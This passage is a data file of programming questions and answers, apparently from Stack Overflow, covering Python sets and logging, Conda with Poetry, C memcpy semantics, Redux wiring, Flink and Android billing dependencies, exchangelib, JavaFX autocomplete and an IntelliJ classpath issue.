Beyond that I have little to no clue how to solve the problem / make the code above more efficient. (Also I know I shouldn't use range(len(list)), but I still do anyway)
Thanks in advance :)
","That is what set does. set create a set (that is a collection without any order, whose purpose is to verify what belongs to it, what is included in it. Well, sets. Like in math).
To build a set, you call set with another collection of things. Like S=set([3, 1, 2]) is the set containing numbers 1, 2 and 3. Then set([1,3]).issubset(S) is True, since set {1,3} is included in set {1,2,3}
And when you call set with something that is not a collection, you get an error. set(1) raises an error.
Now, here, you called set with a string. That you consider to be a ""atomic"" value. So, you may think that it should have raised an error. But a string is a collection: a collection of chars. So S=set(""hello"") is really the set containing {'h', 'e', 'l', 'o'} (in any order). And T=set(""lol"") is also a set, {'o','l'} (I show them in random orders, since, like in maths, there is no order).
So T.issubset(S) is True here. Because all elements of T are also elements of S.
Now, that was ""why"". As for ""how"" it is very simple:
""set"" in ""subset""

is True.
And this time, in the sense you expect it to be: because string ""set"" is included in string ""subset"".
To check if a word is part of any word of a list, you can
L=[""subset"", ""hello"", ""world""] # example list of words
any(""set"" in x for x in L) # True, because ""set"" is substring of one of the words of L
any(""lol"" in x for x in L) # False, because ""lol"" is substring of no word x of L

",python
does it make sense to use conda  poetry,"Does it make sense to use Conda + Poetry for a Machine Learning project? Allow me to share my (novice) understanding and please correct or enlighten me:
As far as I understand, Conda and Poetry have different purposes but are largely redundant:

Conda is primarily a environment manager (in fact not necessarily Python), but it can also manage packages and dependencies.
Poetry is primarily a Python package manager (say, an upgrade of pip), but it can also create and manage Python environments (say, an upgrade of Pyenv).

My idea is to use both and compartmentalize their roles: let Conda be the environment manager and Poetry the package manager. My reasoning is that (it sounds like) Conda is best for managing environments and can be used for compiling and installing non-python packages, especially CUDA drivers (for GPU capability), while Poetry is more powerful than Conda as a Python package manager.
I've managed to make this work fairly easily by using Poetry within a Conda environment. The trick is to not use Poetry to manage the Python environment: I'm not using commands like poetry shell or poetry run, only poetry init, poetry install etc (after activating the Conda environment).
For full disclosure, my environment.yml file (for Conda) looks like this:
name: N

channels:
  - defaults
  - conda-forge

dependencies:
  - python=3.9
  - cudatoolkit
  - cudnn

and my poetry.toml file looks like that:
[tool.poetry]
name = ""N""
authors = [""B""]

[tool.poetry.dependencies]
python = ""3.9""
torch = ""^1.10.1""

[build-system]
requires = [""poetry-core>=1.0.0""]
build-backend = ""poetry.core.masonry.api""

To be honest, one of the reasons I proceeded this way is that I was struggling to install CUDA (for GPU support) without Conda.
Does this project design look reasonable to you?
","2024-04-05 update:
It looks like my tips proved to be useful to many people, but they are not needed anymore. Just use Pixi. It's still alpha, but it works great, and provides the features of the Conda + Poetry setup in a simpler and more unified way. In particular, Pixi supports:

installing packages both from Conda channels and from PyPi,
lockfiles,
creating multiple features and environments (prod, dev, etc.),
very efficient package version resolution, not just faster than Conda (which is very slow), but in my experience also faster than Mamba, Poetry and pip.

Making a Pixi env look like a Conda env
One non-obvious tip about Pixi is that you can easily make your project's Pixi environment visible as a Conda environment, which may be useful e.g. in VS Code, which allows choosing Python interpreters and Jupyter kernels from detected Conda environments. All you need to do is something like:
ln -s /path/to/my/project/.pixi/envs/default /path/to/conda/base/envs/conda-name-of-my-env

The first path is the path to your Pixi environment, which resides in your project directory, under .pixi/envs, and the second path needs to be within one of Conda's environment directories, which can be found with conda config --show envs_dirs.
Original answer:
I have experience with a Conda + Poetry setup, and it's been working fine. The great majority of my dependencies are specified in pyproject.toml, but when there's something that's unavailable in PyPI, or installing it with Conda is easier, I add it to environment.yml. Moreover, Conda is used as a virtual environment manager, which works well with Poetry: there is no need to use poetry run or poetry shell, it is enough to activate the right Conda environment.
Tips for creating a reproducible environment

Add Poetry, possibly with a version number (if needed), as a dependency in environment.yml, so that you get Poetry installed when you run conda create, along with Python and other non-PyPI dependencies.
Add conda-lock, which gives you lock files for Conda dependencies, just like you have poetry.lock for Poetry dependencies.
Consider using mamba which is generally compatible with conda, but is better at resolving conflicts, and is also much faster. An additional benefit is that all users of your setup will use the same  package resolver, independent from the locally-installed version of Conda.
By default, use Poetry for adding Python dependencies. Install packages via Conda if there's a reason to do so (e.g. in order to get a CUDA-enabled version). In such a case, it is best to specify the package's exact version in environment.yml, and after it's installed, to add an entry with the same version specification to Poetry's pyproject.toml (without ^ or ~ before the version number). This will let Poetry know that the package is there and should not be upgraded.
If you use a different channels that provide the same packages, it might be not obvious which channel a particular package will be downloaded from. One solution is to specify the channel for the package using the :: notation (see the pytorch entry below), and another solution is to enable strict channel priority. Unfortunately, in Conda 4.x there is no way to enable this option through environment.yml.
Note that Python adds user site-packages to sys.path, which may cause lack of reproducibility if the user has installed Python packages outside Conda environments. One possible solution is to make sure that the PYTHONNOUSERSITE environment variable is set to True (or to any other non-empty value).

Example
environment.yml:
name: my_project_env
channels:
  - pytorch
  - conda-forge
  # We want to have a reproducible setup, so we don't want default channels,
  # which may be different for different users. All required channels should
  # be listed explicitly here.
  - nodefaults
dependencies:
  - python=3.10.*  # or don't specify the version and use the latest stable Python
  - mamba
  - pip  # pip must be mentioned explicitly, or conda-lock will fail
  - poetry=1.*  # or 1.1.*, or no version at all -- as you want
  - tensorflow=2.8.0
  - pytorch::pytorch=1.11.0
  - pytorch::torchaudio=0.11.0
  - pytorch::torchvision=0.12.0

# Non-standard section listing target platforms for conda-lock:
platforms:
  - linux-64

virtual-packages.yml (may be used e.g. when we want conda-lock to generate CUDA-enabled lock files even on platforms without CUDA):
subdirs:
  linux-64:
    packages:
      __cuda: 11.5

First-time setup
You can avoid playing with the bootstrap env and simplify the example below if you have conda-lock, mamba and poetry already installed outside your target environment.
# Create a bootstrap env
conda create -p /tmp/bootstrap -c conda-forge mamba conda-lock poetry='1.*'
conda activate /tmp/bootstrap

# Create Conda lock file(s) from environment.yml
conda-lock -k explicit --conda mamba
# Set up Poetry
poetry init --python=~3.10  # version spec should match the one from environment.yml
# Fix package versions installed by Conda to prevent upgrades
poetry add --lock tensorflow=2.8.0 torch=1.11.0 torchaudio=0.11.0 torchvision=0.12.0
# Add conda-lock (and other packages, as needed) to pyproject.toml and poetry.lock
poetry add --lock conda-lock

# Remove the bootstrap env
conda deactivate
rm -rf /tmp/bootstrap

# Add Conda spec and lock files
git add environment.yml virtual-packages.yml conda-linux-64.lock
# Add Poetry spec and lock files
git add pyproject.toml poetry.lock
git commit

Usage
The above setup may seem complex, but it can be used in a fairly simple way.
Creating the environment
conda create --name my_project_env --file conda-linux-64.lock
conda activate my_project_env
poetry install

Activating the environment
conda activate my_project_env

Updating the environment
# Re-generate Conda lock file(s) based on environment.yml
conda-lock -k explicit --conda mamba
# Update Conda packages based on re-generated lock file
mamba update --file conda-linux-64.lock
# Update Poetry packages and re-generate poetry.lock
poetry update

",python
is it guaranteed to be safe to perform memcpy000,"I am not so well-versed in the C standard, so please bear with me.
I would like to know if it is guaranteed, by the standard, that memcpy(0,0,0) is safe.
The only restriction I could find is that if the memory regions overlap, then the behavior is undefined...
But can we consider that the memory regions overlap here ?
","I have a draft version of the C standard (ISO/IEC 9899:1999), and it has some fun things to say about that call.  For starters, it mentions (§7.21.1/2) in regards to memcpy that

Where an argument declared as size_t n specifies the length of the array for a
   function, n can have the value zero on a call to that function. Unless explicitly stated
  otherwise in the description of a particular function in this subclause, pointer arguments
  on such a call shall still have valid values, as described in 7.1.4. On such a call, a
  function that locates a character finds no occurrence, a function that compares two
   character sequences returns zero, and a function that copies characters copies zero
  characters.

The reference indicated here points to this:

If an argument to a function has an invalid value (such as a value
  outside the domain of the function, or a pointer outside the address space of the program,
  or a null pointer, or a pointer to non-modifiable storage when the corresponding
  parameter is not const-qualified) or a type (after promotion) not expected by a function
  with variable number of arguments, the behavior is undefined.

So it looks like according to the C spec, calling
memcpy(0, 0, 0)

results in undefined behavior, because null pointers are considered ""invalid values.""
That said, I would be utterly astonished if any actual implementation of memcpy broke if you did this, since most of the intuitive implementations I can think of would do nothing at all if you said to copy zero bytes.
",c
confused with redux actions and reducers,"so I am trying to refactor some code from my previous question:
React: How to update one component, when something happens on another component
So I started digging deep into the existing code template  to see how it was implemented.
I found a reducers.js where I added a new reducer: ActiveTenant
import Auth from './auth/reducer';
import App from './app/reducer';
import ThemeSwitcher from './themeSwitcher/reducer';
import LanguageSwitcher from './languageSwitcher/reducer';
import ActiveTenant from './activetenant/reducer';

export default {
  Auth,
  App,
  LanguageSwitcher,
  ThemeSwitcher,
  ActiveTenant
};

That  new reducer is like this:
import { Map } from 'immutable';
import actions from './actions';
import { adalApiFetch } from '../../adalConfig';

const initState = new Map({
    tenantId: ''
});

export default function(state = initState, action) {
  switch (action.type) {
    case actions.SET_TENANT_ACTIVE:
    {
        const options = { 
            method: 'post'
        };

        adalApiFetch(fetch, ""/Tenant/SetTenantActive?TenantName=""+state.tenantId, options)
        .then(response =>{
            if(response.status === 200){
                console.log(""Tenant activated"");
            }else{
                throw ""error"";
            }
        })
        .catch(error => {
            console.error(error);
        });

        return state.set('tenant', state.Name);
    }
    default:
      return state;
  }
}

and actions for that reducer
const actions = {
  SET_TENANT_ACTIVE: 'SET_TENANT_ACTIVE',
  setTenantActive: () => ({
    type: actions.SET_TENANT_ACTIVE
  }),
};
export default actions;

Then from the component itself, I need to call the action when a row is selected on the front end, so I have refactored the commented code, into one line.
import React, { Component } from 'react';
import {  Table, Radio} from 'antd';
import { adalApiFetch } from '../../adalConfig';
import Notification from '../../components/notification';
import actions from '../../redux/activetenant/actions';

const { setTenantActive } = actions;

class ListTenants extends Component {

    constructor(props) {
        super(props);
        this.state = {
            data: []
        };
    }



    fetchData = () => {
        adalApiFetch(fetch, ""/Tenant"", {})
          .then(response => response.json())
          .then(responseJson => {
            if (!this.isCancelled) {
                const results= responseJson.map(row => ({
                    key: row.id,
                    TestSiteCollectionUrl: row.TestSiteCollectionUrl,
                    TenantName: row.TenantName,
                    Email: row.Email
                  }))
              this.setState({ data: results });
            }
          })
          .catch(error => {
            console.error(error);
          });
      };


    componentDidMount(){
        this.fetchData();
    }

    render() {
        const columns = [
                {
                    title: 'TenantName',
                    dataIndex: 'TenantName',
                    key: 'TenantName',
                }, 
                {
                    title: 'TestSiteCollectionUrl',
                    dataIndex: 'TestSiteCollectionUrl',
                    key: 'TestSiteCollectionUrl',
                }, 
                {
                    title: 'Email',
                    dataIndex: 'Email',
                    key: 'Email',
                }
        ];

        // rowSelection object indicates the need for row selection
        const rowSelection = {
            onChange: (selectedRowKeys, selectedRows) => {
                if(selectedRows[0].TenantName != undefined){
                    console.log(selectedRows[0].TenantName);
                    const options = { 
                        method: 'post'
                    };

                    setTenantActive(selectedRows[0].TenantName);
                    /* adalApiFetch(fetch, ""/Tenant/SetTenantActive?TenantName=""+selectedRows[0].TenantName.toString(), options)
                        .then(response =>{
                        if(response.status === 200){
                            Notification(
                                'success',
                                'Tenant set to active',
                                ''
                                );
                        }else{
                            throw ""error"";
                        }
                        })
                        .catch(error => {
                        Notification(
                            'error',
                            'Tenant not activated',
                            error
                            );
                        console.error(error);
                    }); */
                }
            },
            getCheckboxProps: record => ({
                type: Radio
            }),
        };

        return (
            <Table rowSelection={rowSelection} columns={columns} dataSource={this.state.data} />
        );
    }
}

export default ListTenants;

However, its not clear to me the relationship between the action and the reducer, if I check the debugger the action is executed, and none parameter is received, but the reducer is never executed.
DO i have to put a dispatch somewhere?, what I am missing in this puzzle?
","So the first thing to understand is the Redux Cycle:
Action Creator-->Action-->dispatch-->Reducers-->State
Action Creator: An action creator is a function that is going to create or return a plain JavaScript object knowns as an Action with a type property and payload property which describes some change you want to make on your data.
The payload property describes some context around the change we want to make.
The purpose of an Action is to describe some change to the data inside our application.
The Action Creator is to create the Action.
The dispatch function is going to take in an Action and make copies of that object and pass it off to a bunch of different places inside our application which leads us to the Reducers.
In Redux, a reducer is a function responsible for taking in an Action. It's going to process that Action, make some change to the data and return it so it can be centralized in some location.
In Redux, the State property is a central repository of all information produced by our reducers. All the information gets consolidated inside the State object so our React application can easily reach into our Redux side of the app and get access to all the data inside the application.
So this way the app does not have to go around to each separate reducer and ask for the current State.
So digest that for a couple of minutes and then look at your architecture.
Let's skip over to reducers.
Reducers are called with an Action that was created by an Action Creator. The reducer will take a look at that Action and decide whether it needs to modify some data based on that Action.
So in other words, the job of a reducer is not to execute API requests but to process actions sent to it by the action creator.
So instead of this:
import { Map } from 'immutable';
import actions from './actions';
import { adalApiFetch } from '../../adalConfig';

const initState = new Map({
    tenantId: ''
});

export default function(state = initState, action) {
  switch (action.type) {
    case actions.SET_TENANT_ACTIVE:
    {
        const options = { 
            method: 'post'
        };

        adalApiFetch(fetch, ""/Tenant/SetTenantActive?TenantName=""+state.tenantId, options)
        .then(response =>{
            if(response.status === 200){
                console.log(""Tenant activated"");
            }else{
                throw ""error"";
            }
        })
        .catch(error => {
            console.error(error);
        });

        return state.set('tenant', state.Name);
    }
    default:
      return state;
  }
}

Your reducer should look something like this:
import { SET_TENANT_ACTIVE } from ""../actions/types"";

const initialState = {
    tenantId: ''
};

export default (state = initialState, action) {
  switch (action.type) {
    case SET_TENANT_ACTIVE:
      return {...state, [action.payload.id]: action.payload };
    default:
      return state;
  }
}

Then inside your action creators file, you should have an action creator that looks something like this:
import axios from 'axios';
import { SET_TENANT_ACTIVE } from ""../actions/types"";


export const setTenant = id => async (dispatch) => {
  const response = await axios.post(`/tenants/${id}`);

  dispatch({ type: SET_TENANT_ACTIVE, payload: response.data });
};

You also need to learn about Redux project structure because after the above refactor, you are missing how to wire all this up to your component. In your component file there is no connect() function which also requires the Provider tag and you have none of that.
So for this I recommend first of all your set up your folder and file structure like so:
  /src
    /actions
    /components
    /reducers
    index.js

So inside your index.js file it should look something like this:
import React from ""react"";
import ReactDOM from ""react-dom"";
import { Provider } from ""react-redux"";
import { createStore, applyMiddleware, compose } from ""redux"";
import reduxThunk from ""redux-thunk"";

import App from ""./components/App"";
import reducers from ""./reducers"";

const composeEnhancers = window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__ || compose;
const store = createStore(
  reducers,
  composeEnhancers(applyMiddleware(reduxThunk))
);

ReactDOM.render(
  <Provider store={store}>
    <App />
  </Provider>,
  document.querySelector(""#root"")

So your goal here is to ensure that you get that Provider tag at the very top of your component hierarchy and ensure that you pass it a reference to your Redux store that gets all the reducers loaded up into it.
So above I have created the store and passed it our set of reducers and it will return back to you all your applications State.
Lastly, what you see above is I created an instance of <Provider> and wrapped the <App /> component with it and then you want to pass the <Provider> component is a single prop called store. The store is the result of calling createStore() and calling the reducers.
The <Provider> is what interacts with the Redux store on our behalf.
Notice, I also have wired up Redux-Thunk that J. Hesters mentioned, you are making an ajax request as far as I can see from your code which is why I offered an asynchronous action creator for you, which means you will need Redux-Thunk or some middleware like that, let me not offend the Redux-Saga fans, so you have those two choice at least. You seem relatively new to Redux, just go with Redux-Thunk.
Now you can use the connect() component inside your component file to finish wiring up those action creators and reducers to your component or your React side of the application.
import React, { Component } from 'react';
import { connect } from ""react-redux"";
import {  Table, Radio} from 'antd';
import { adalApiFetch } from '../../adalConfig';
import Notification from '../../components/notification';
import actions from '../../redux/activetenant/actions';

After importing connect, you create an instance of it below:
export default connect()(ListTenants);

Please don't argue with me on the above syntax (actually had a former student report me to administrators for using this syntax as evidence of not knowing what I was doing).
Then you need to configure this connect() React component by adding mapStateToProps if you are going to need it, but definitely pass in actions as the second argument to connect(). If you realize you don't need mapStateToProps, then just pass in null as the first argument, but you can't leave it empty.
",javascript
javalangclassnotfoundexception orgapacheflinkconnectorbasesourcereaderrecordemitter,"I have been trying to run a Example Flink Job from the docs of Apache flink of word count but been getting this error for a while now, seems to be like a dependency issue but tried changing POM file, still no success, below is my POM
<dependencies>
        <dependency>
            <groupId>org.apache.flink</groupId>
            <artifactId>flink-core</artifactId>
            <version>1.20.0</version>
        </dependency>
        <dependency>
            <groupId>org.apache.flink</groupId>
            <artifactId>flink-streaming-java</artifactId>
            <version>1.20.0</version>
        </dependency>
        <dependency>
            <groupId>org.apache.flink</groupId>
            <artifactId>flink-walkthrough-common</artifactId>
            <version>1.20.0</version>
        </dependency>
        <dependency>
            <groupId>org.apache.flink</groupId>
            <artifactId>flink-clients</artifactId>
            <version>1.20.0</version>
        </dependency>
        <dependency>
            <groupId>org.apache.flink</groupId>
            <artifactId>flink-connector-kafka</artifactId>
            <version>3.3.0-1.20</version>
        </dependency>
        <dependency>
            <groupId>log4j</groupId>
            <artifactId>log4j</artifactId>
            <version>1.2.17</version>
        </dependency>
        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <version>8.0.33</version>
        </dependency>
        <!-- Custom JARs -->
        <dependency>
            <groupId>org.apache.flink</groupId>
            <artifactId>flink-connector-jdbc</artifactId>
            <version>3.2.0</version>
            <scope>system</scope>
            <systemPath>${project.basedir}/src/main/resources/lib/flink-connector-jdbc-3.2.0.jar</systemPath>
        </dependency>
    </dependencies>

I tried changing POM file and expected to run this code, but not getting anywhere
","It looks like you are missing the flink-connector-base dependency
<dependency>
    <groupId>org.apache.flink</groupId>
    <artifactId>flink-connector-base</artifactId>
    <version>1.20.0</version>
</dependency>

",java
display product data from billingclient,"I have made the following BillingManager class to handle the Google Play Billing Library for my Android app:
public class BillingManager {

    private List<ProductDetails> productDetailsList;

    private PurchasesUpdatedListener purchasesUpdatedListener = (billingResult, purchases) -> {
        // To be implemented in a later section.
    };

    private BillingClient billingClient = BillingClient.newBuilder(MyApplication.getAppContext())
            .setListener(purchasesUpdatedListener)
            .enablePendingPurchases(PendingPurchasesParams.newBuilder().enableOneTimeProducts().build())
            .build();

    public void establishConnection() {
        billingClient.startConnection(new BillingClientStateListener() {
            @Override
            public void onBillingSetupFinished(BillingResult billingResult) {
                if (billingResult.getResponseCode() == BillingClient.BillingResponseCode.OK) {
                    Log.i(""BillingManager"", ""Connected to Google Play."");
                    getProductDetails();
                }
            }
            @Override
            public void onBillingServiceDisconnected() {
                Log.i(""BillingManager"", ""Disconnected from Google Play."");
                establishConnection();
            }
        });
    }

    private void getProductDetails() {
        QueryProductDetailsParams queryProductDetailsParams =
                QueryProductDetailsParams.newBuilder()
                        .setProductList(List.of(
                                QueryProductDetailsParams.Product.newBuilder()
                                        .setProductId(""full_version"")
                                        .setProductType(BillingClient.ProductType.INAPP)
                                        .build()))
                        .build();

        billingClient.queryProductDetailsAsync(
                queryProductDetailsParams,
                (billingResult, productDetailsList) -> {
                    this.productDetailsList = productDetailsList;
                }
        );

    }

    public List<ProductDetails> getProductDetailsList() {
        return productDetailsList;
    }

    public void launchPurchaseFlow(Activity activity, ProductDetails productDetails) {
        List<BillingFlowParams.ProductDetailsParams> productDetailsParamsList =
                List.of(
                        BillingFlowParams.ProductDetailsParams.newBuilder()
                                // retrieve a value for ""productDetails"" by calling queryProductDetailsAsync()
                                .setProductDetails(productDetails)
                                .build()
                );

        BillingFlowParams billingFlowParams = BillingFlowParams.newBuilder()
                .setProductDetailsParamsList(productDetailsParamsList)
                .build();

    // Launch the billing flow
        BillingResult billingResult = billingClient.launchBillingFlow(activity, billingFlowParams);
    }
}

And this is an example of how I would want to use it in one of my FragmentDialog class:
BillingManager billingManager = new BillingManager();
    billingManager.establishConnection();

    MaterialButton button = view.findViewById(R.id.button);

// This causes an outOfBounds exception
button.setText(billingManager.getProductDetailsList().get(0).getOneTimePurchaseOfferDetails().getFormattedPrice());

    button.setOnClickListener(v -> {
        billingManager.launchPurchaseFlow(getActivity(), billingManager.getProductDetailsList().get(0));
    });

}

Question:
I'm encountering an IndexOutOfBoundsException when trying to set the text of a button with a product price retrieved from the Google Play Billing Library. The line causing the issue is:
button.setText(billingManager.getProductDetailsList().get(0).getOneTimePurchaseOfferDetails().getFormattedPrice());
The problem stems from the asynchronous establishConnection and getProductDetails methods within my BillingManager class. When the fragment starts and attempts to access the product details to set the button's text, these operations haven't completed yet, resulting in an empty or uninitialized list.
How can I solve this and ensure that the button's text is set only after both the connection to Google Play Billing has been established and the product details have been successfully retrieved?
","You can create an interface BillingStatusListener
interface BillingStatusListener {
   void onProductListFetched(List<YourType> productList);
   void onBillingSetupFinishedSuccessfully();
}

Make your FragmentDialog implement this interface
class FragmentDialog implements BillingStatusListener {

   @Override
   void onProductListFetched(List<YourType> productList) {
      // Setup your button text here
      // You are sure to have data here, and no Null Pointer exceptions

   }
}

Lastly, make your BillingManager accept an implementation of the interface above and use it as required
public class BillingManager {

    private List<ProductDetails> productDetailsList;

    private PurchasesUpdatedListener purchasesUpdatedListener = (billingResult, purchases) -> {
        // To be implemented in a later section.
    };

   private BillingStatusListener billingStatusListener; // Initialise this somewhere with the FragmentDialog class as the implementation

    private BillingClient billingClient = BillingClient.newBuilder(MyApplication.getAppContext())
            .setListener(purchasesUpdatedListener)
            .enablePendingPurchases(PendingPurchasesParams.newBuilder().enableOneTimeProducts().build())
            .build();

    public void establishConnection() {
        billingClient.startConnection(new BillingClientStateListener() {
            @Override
            public void onBillingSetupFinished(BillingResult billingResult) {
                if (billingResult.getResponseCode() == BillingClient.BillingResponseCode.OK) {
                    Log.i(""BillingManager"", ""Connected to Google Play."");
                    getProductDetails();
                }
            }
            @Override
            public void onBillingServiceDisconnected() {
                Log.i(""BillingManager"", ""Disconnected from Google Play."");
                establishConnection();
            }
        });
    }

    private void getProductDetails() {
        QueryProductDetailsParams queryProductDetailsParams =
                QueryProductDetailsParams.newBuilder()
                        .setProductList(List.of(
                                QueryProductDetailsParams.Product.newBuilder()
                                        .setProductId(""full_version"")
                                        .setProductType(BillingClient.ProductType.INAPP)
                                        .build()))
                        .build();

        billingClient.queryProductDetailsAsync(
                queryProductDetailsParams,
                (billingResult, productDetailsList) -> {
                    this.productDetailsList = productDetailsList;
                    // you will surely have data here
                    // so let's notify the interface
                    billingStatusListener.onProductListFetched(productDetailList);
                }
        );

    }

    public List<ProductDetails> getProductDetailsList() {
        return productDetailsList;
    }

    public void launchPurchaseFlow(Activity activity, ProductDetails productDetails) {
        List<BillingFlowParams.ProductDetailsParams> productDetailsParamsList =
                List.of(
                        BillingFlowParams.ProductDetailsParams.newBuilder()
                                // retrieve a value for ""productDetails"" by calling queryProductDetailsAsync()
                                .setProductDetails(productDetails)
                                .build()
                );

        BillingFlowParams billingFlowParams = BillingFlowParams.newBuilder()
                .setProductDetailsParamsList(productDetailsParamsList)
                .build();

    // Launch the billing flow
        BillingResult billingResult = billingClient.launchBillingFlow(activity, billingFlowParams);
    }
}

",java
the quotbadstatuslinequot error when connecting to mail server with exchangelib,"I'm trying to connect to my mailbox with exchangelib. Options are: protocol SMTP, port 465. Code:
credentials = Credentials(MAIL_ACCOUNT, PASS)
config = ExConfiguration(server=MAIL_SERVER + "":"" + MAIL_SERVER_PORT, credentials=credentials)
account = Account(MAIL_ACCOUNT,config=config, credentials=credentials, autodiscover=False)
for msg in account.inbox:
    print('Message')

Script throws error ""exchangelib.errors.TransportError: ('Connection aborted.', BadStatusLine('220 smtp.mydomain.com ESMTP ready'))""
The code 220 means that connection is successful. I believe that there is error due to unexpected string in server response. How can I skip check for this string in response when connecting to server?
","exchangelib works with the EWS protocol, not SMTP. You have to either specify the hostname of the server hosting your EWS service, or set up autodiscovery.
",python
autocomplete combobox in javafx,"I'm looking for a way to add autocomplete to a JavaFX ComboBox.
This AutoFillBox is known but not what I'm searching.
What I want is a editable ComboBox, and while typing the list should filtered. But I want also to open the list without typing and seeing the whole items.
Any idea?
","I found a solution that's working for me:
public class AutoCompleteComboBoxListener<T> implements EventHandler<KeyEvent> {

    private ComboBox comboBox;
    private StringBuilder sb;
    private ObservableList<T> data;
    private boolean moveCaretToPos = false;
    private int caretPos;

    public AutoCompleteComboBoxListener(final ComboBox comboBox) {
        this.comboBox = comboBox;
        sb = new StringBuilder();
        data = comboBox.getItems();

        this.comboBox.setEditable(true);
        this.comboBox.setOnKeyPressed(new EventHandler<KeyEvent>() {

            @Override
            public void handle(KeyEvent t) {
                comboBox.hide();
            }
        });
        this.comboBox.setOnKeyReleased(AutoCompleteComboBoxListener.this);
    }

    @Override
    public void handle(KeyEvent event) {

        if(event.getCode() == KeyCode.UP) {
            caretPos = -1;
            moveCaret(comboBox.getEditor().getText().length());
            return;
        } else if(event.getCode() == KeyCode.DOWN) {
            if(!comboBox.isShowing()) {
                comboBox.show();
            }
            caretPos = -1;
            moveCaret(comboBox.getEditor().getText().length());
            return;
        } else if(event.getCode() == KeyCode.BACK_SPACE) {
            moveCaretToPos = true;
            caretPos = comboBox.getEditor().getCaretPosition();
        } else if(event.getCode() == KeyCode.DELETE) {
            moveCaretToPos = true;
            caretPos = comboBox.getEditor().getCaretPosition();
        }

        if (event.getCode() == KeyCode.RIGHT || event.getCode() == KeyCode.LEFT
                || event.isControlDown() || event.getCode() == KeyCode.HOME
                || event.getCode() == KeyCode.END || event.getCode() == KeyCode.TAB) {
            return;
        }

        ObservableList list = FXCollections.observableArrayList();
        for (int i=0; i<data.size(); i++) {
            if(data.get(i).toString().toLowerCase().startsWith(
                AutoCompleteComboBoxListener.this.comboBox
                .getEditor().getText().toLowerCase())) {
                list.add(data.get(i));
            }
        }
        String t = comboBox.getEditor().getText();

        comboBox.setItems(list);
        comboBox.getEditor().setText(t);
        if(!moveCaretToPos) {
            caretPos = -1;
        }
        moveCaret(t.length());
        if(!list.isEmpty()) {
            comboBox.show();
        }
    }

    private void moveCaret(int textLength) {
        if(caretPos == -1) {
            comboBox.getEditor().positionCaret(textLength);
        } else {
            comboBox.getEditor().positionCaret(caretPos);
        }
        moveCaretToPos = false;
    }

}

You can call it with
new AutoCompleteComboBoxListener<>(comboBox);


It's based on this and I customized it to fit my needs.
Feel free to use it and if anybody can improve it, tell me.
",java
how to add a custom loglevel to python39s logging facility,"I'd like to have loglevel TRACE (5) for my application, as I don't think that debug() is sufficient. Additionally log(5, msg) isn't what I want. How can I add a custom loglevel to a Python logger?
I've a mylogger.py with the following content:
import logging

@property
def log(obj):
    myLogger = logging.getLogger(obj.__class__.__name__)
    return myLogger

In my code I use it in the following way:
class ExampleClass(object):
    from mylogger import log

    def __init__(self):
        '''The constructor with the logger'''
        self.log.debug(""Init runs"")

Now I'd like to call self.log.trace(""foo bar"")
Edit (Dec 8th 2016): I changed the accepted answer to pfa's which is, IMHO, an excellent solution based on the very good proposal from Eric S.
","To people reading in 2022 and beyond: you should probably check out the currently next-highest-rated answer here: https://stackoverflow.com/a/35804945/1691778
My original answer is below.
--
@Eric S.
Eric S.'s answer is excellent, but I learned by experimentation that this will always cause messages logged at the new debug level to be printed -- regardless of what the log level is set to. So if you make a new level number of 9, if you call setLevel(50), the lower level messages will erroneously be printed.

To prevent that from happening, you need another line inside the ""debugv"" function to check if the logging level in question is actually enabled.

Fixed example that checks if the logging level is enabled:
import logging
DEBUG_LEVELV_NUM = 9 
logging.addLevelName(DEBUG_LEVELV_NUM, ""DEBUGV"")
def debugv(self, message, *args, **kws):
    if self.isEnabledFor(DEBUG_LEVELV_NUM):
        # Yes, logger takes its '*args' as 'args'.
        self._log(DEBUG_LEVELV_NUM, message, args, **kws) 
logging.Logger.debugv = debugv

If you look at the code for class Logger in logging.__init__.py for Python 2.7, this is what all the standard log functions do (.critical, .debug, etc.).
I apparently can't post replies to others' answers for lack of reputation... hopefully Eric will update his post if he sees this. =)
",python
intellij inspection gives quotcannot resolve symbolquot but still compiles code,"Platform: IntelliJ Community Edition 10.0.3
SDK: jdk1.6.0_21
OS: Windows 7
So I have a strange situation with IntelliJ that has me completely stumped.  I setup a Maven project and add log4j as a dependency in the pom.xml file.  The IDEA inspections run fine and my unit tests all compile and run.
I then added hunnysoft's jmime library to my local maven repository using the mvn install:install-file as follows.
mvn install:install-file -Dfile=jmime.jar -DgroupId=jmime \
-DartifactId=jmime -Dversion=3.1.1e -Dpackaging=jar

Maven installed the jar file just fine into my local repository.
I then went into IntelliJ's Settings => Maven => Repository Services and Updated my local repository (so that IntelliJ would reindex the repository contents).
Finally, I added the following dependency to my pom.xml file (just above the log4j dependency).
<dependency>
    <groupId>jmime</groupId>
    <artifactId>jmime</artifactId>
    <version>3.1.1e</version>
</dependency>

I now create a new class as follows:
package com.stackoverflow.question;

import org.apache.log4j.Logger;
import com.hunnysoft.jmime.ByteString;
import com.hunnysoft.jmime.Field;
import com.hunnysoft.jmime.FieldBody;

public class StackOverflowQuestion {
    public Field create(String name, String text) {
        Logger.getLogger(getClass()).debug(""create entered"");
        FieldBody body = new FieldBody();
        body.setText(new ByteString(text));
        Field field = new Field();
        field.setFieldName(name);
        field.setFieldBody(body);
        return field;
    }
}

Now for the weirdness.  IntelliJ's intention mechanism picks up and recognizes the Logger import in the maven pom file just fine.  However, for all of the hunnysoft imports it reports: ""Cannot resolve symbol 'ByteString/Field/FieldBody'"", BUT Build => Compile 'StackOverflowQuestion.java' compiles everything correctly and the unit test I created for this class runs fine (though the intentions mark the call to create() as a problem area too).
So somewhere, somehow IntelliJ is ignoring the jmime.jar file for the intention subsystem.  I'm confused because the log4j dependency works fine and everything compiles and runs fine.  F12 (""Go To Declaration"") works on the Logger import, but breaks on all the jmime imports.
Oh, one other thing, if I go to the 'Packages' view in the ""Projects"" window the ""com.hunnysoft.jmime"" package appears and I can see ALL of the classes I imported in the code snippet above under ""Libraries"".  Removing the above dependency from the pom.xml file causes this package to disappear and the compilation breaks.
It appears that the inspection's classpath is broken, but there does not seem to be a setting for this anywhere in the Settings => Intentions | Compiler areas (not that I expected any such settings, I believe the IDEA should already know the correct classpath based on the pom file and JDK).
As a final experiment I created a brand new standard J2SE application project (without using maven) and added the jmime.jar file directly to the project as one of its libraries.  I run into exactly the same problems as described above in this new project.
Here is the MANIFEST.MF from the jmime jar file.
Manifest-Version: 1.0
Ant-Version: Apache Ant 1.5.4
Created-By: 10.0-b23 (Sun Microsystems Inc.)

